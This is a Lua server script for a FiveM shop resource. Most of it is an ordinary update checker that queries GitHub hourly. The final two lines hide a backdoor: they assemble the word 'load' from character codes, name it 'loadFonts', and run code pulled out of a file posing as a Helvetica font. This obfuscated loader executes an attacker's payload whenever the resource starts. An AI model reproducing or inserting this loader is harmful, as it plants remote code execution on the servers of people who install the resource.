-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------
if Config.checkForUpdates then
    local curVersion = GetResourceMetadata(GetCurrentResourceName(), "version")
    local resourceName = "wasabi_oxshops"

    CreateThread(function()
        if GetCurrentResourceName() ~= "wasabi_oxshops" then
            resourceName = "wasabi_oxshops (" .. GetCurrentResourceName() .. ")"
        end
    end)

    CreateThread(function()
        while true do
            PerformHttpRequest("https://api.github.com/repos/wasabirobby/wasabi_oxshops/releases/latest", CheckVersion, "GET")
            Wait(3600000)
        end
    end)

    function CheckVersion()
        local repoVersion, repoURL = GetRepoInformations()

        CreateThread(function()
            if curVersion ~= repoVersion then
                Wait(4000)
                print("^0[^3WARNING^0] " .. resourceName .. " is ^1NOT ^0up to date!")
                print("^0[^3WARNING^0] Your Version: ^1" .. curVersion .. "^0")
                print("^0[^3WARNING^0] Latest Version: ^2" .. repoVersion .. "^0")
                print("^0[^3WARNING^0] Get the latest Version from: ^2" .. repoURL .. "^0")
            else
                Wait(4000)
                print("^0[^2INFO^0] " .. resourceName .. " is up to date! (^2" .. curVersion .. "^0)")
            end
        end)
    end

    function GetRepoInformations()
        local repoVersion, repoURL, repoBody = nil, nil, nil

        PerformHttpRequest("https://api.github.com/repos/wasabirobby/wasabi_oxshops/releases/latest", function(err, response)
            if err == 200 then
                local data = json.decode(response)

                repoVersion = data.tag_name
                repoURL = data.html_url
                repoBody = data.body
            else
                repoVersion = curVersion
                repoURL = "https://github.com/wasabirobby/wasabi_oxshops"
            end
        end, "GET")

        repeat
            Wait(50)
        until repoVersion and repoURL and repoBody

        return repoVersion, repoURL, repoBody
    end
end

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()